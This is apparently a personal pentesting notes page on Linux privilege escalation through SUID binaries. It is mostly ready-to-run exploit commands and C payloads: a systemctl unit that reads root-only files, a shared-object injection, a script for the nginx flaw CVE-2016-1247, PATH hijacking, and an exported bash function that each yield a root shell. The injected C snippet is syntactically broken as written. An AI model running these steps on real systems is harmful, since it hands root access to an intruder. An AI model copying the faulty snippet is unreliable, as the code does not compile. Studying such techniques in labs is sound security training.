-- -
Abuse software that is vulnerable to being hijacked to run a shell command or file read or something it shouldn't because it has its SUID bit set and runs as root always. 
### General workflow
#### Enum
![[Dark Arts/Privesc/Linux/Enumeration/SUIDs#^ed7f08]]
#### Find Exploits
Go to [GTFOBins](https://gtfobins.github.io/#+suid) and search the output of above command. 

### Things I've Exploited
#### systemctl
#sytemctlexploit It is a file read exploit, so you won't get a shell, but you can read any file root can. 
```bash
TF=$(mktemp).service
echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
cat /tmp/output # outputs the file you wanted to read
```
### Shared Object Injection

^2ec112

#SOInjection 
#### Enum
![[Dark Arts/Privesc/Linux/Enumeration/SUIDs#^8b428f]]
#### Exploit
```bash
# So this will be an example, the specifics in your situation will depend on the situation you are in. 

# in this example, it was looking for the file:
# /home/user/.config/libcalc.so
# .config nor libcalc.so exist at those locations, so we will make the directory and create some C code that will hijack execution when suid-so picks it up
cd /home/user
mkdir .config
cd .config
vim libcalc.c
```
**libcalc.c**
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
void inject {
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p")
}
```
#### Compile and exploit
```bash
# Compile to the expected location with the expected file
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/.config/libcalc.c

# run original suid program
/usr/local/bin/suid-so
```

#### CVE-2016-1247
#cve-2016-1247  [Explanation](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html), If certain conditions are met, a user www-data is able to escalate privileges to root. 
[[Dark Arts/Privesc/Linux/Enumeration/SUIDs#^14400b|Enum]]
##### Exploit
Assuming enum was done and the conditions are right, download script from [here](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html) , and [[Dark Arts I/File Transfer/Linux|file transfer]] it to the target, then simply run the script: 

```bash
./nginxed-root.sh /var/log/nginx/error.log

# then you need to wait for the nginx service to be restarted, or it can manually be done by root, ssh as root into server:
invoke-rc.d nginx rotate >/dev/null 2>&1

# obviously if you already have root to force it, this is useless so practically, you will need to sit and wait for nginx to restart for some other reason. 
```

#### Env Variables

^460797

This relies on weird/custom programs with suid bit set, there are 2 examples worked out here for two situations
1. Relative path used
2. Absolute path used

Which is used is determined through [[Dark Arts/Privesc/Linux/Enumeration/SUIDs|Enum]]
##### Relative Path
Obviously, the specifics of what program you are hijacking and which SUID you are running is different depending on the situation, but steps should more or less be the same except the name of the two programs here.
```bash 
# in this example, the output from strings revealed:
# service apache2 start
# and the vulnerable suid program in this example is
# /usr/local/bin/suid-env

# in this case, you can add to your $PATH and set a location you control to the front of your path, and write a program named "service" there so that when the SUID program is run, it calls to your malicious program rather than the real service program since it will check your controlled folder first. Since the calling program is root, that means your program will be run as root.

# so, write a program that spaws a shell then run SUID program

# Prepare malicious program and output to a directory you control
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c

# compile
gcc /tmp/service.c -o /tmp/service

# add your controlled directory to front of $PATH
export PATH=/tmp:$PATH

# run SUID program
/usr/local/bin/suid-env

# now you should have a root shell.
```

##### Absolute path
Obviously, the specifics of what program you are hijacking and which SUID you are running is different depending on the situation, but steps should more or less be the same except the name of the two programs here.
```bash
# in this example, the output from strings revealed:
# /usr/sbin/service apach2 start
# and the vulnerable suid program in this example is
# /usr/local/bin/suid-env

# in this case you will create a malicious function and make a symlink to it so that it's picked up by the vulnerable SUID program.

# Create malicious function
# malicious function copies /bin/bash to a controlled directory
# then, malicious function adds suid bit to copy of /bin/bash
# then, malicious function runs the copy of /bin/bash
# since the suid bit was set, it will be a root shell.
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }

# set service program to refer to shell function, our malicious function, rather than running the actual program:
export -f /usr/sbin/service

# then just run the vulnerable suid program
/usr/local/bin/suid-env
```